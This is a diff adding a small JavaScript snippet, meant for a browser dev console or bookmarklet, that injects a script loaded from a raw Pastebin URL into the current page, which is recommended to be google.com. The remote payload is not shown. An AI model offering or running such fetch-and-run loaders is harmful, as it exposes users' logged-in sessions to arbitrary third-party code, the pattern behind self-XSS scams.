@@ -1,0 +1,13 @@
+/*
+
+*This is intened to be used in a dev console or a bookmarklet
+*if you don't know what ither of those are, you might want to do some research
+*Recommended use on google.com, but it can be used most places
+
+*/
+
+//code starts here
+(function Ximp(url) {
+    (s = document.createElement('script')).src = url;
+    (document.getElementsByTagName("head")[0]).appendChild(s);
+})('https://pastebin.com/raw/0vfvNm7v');
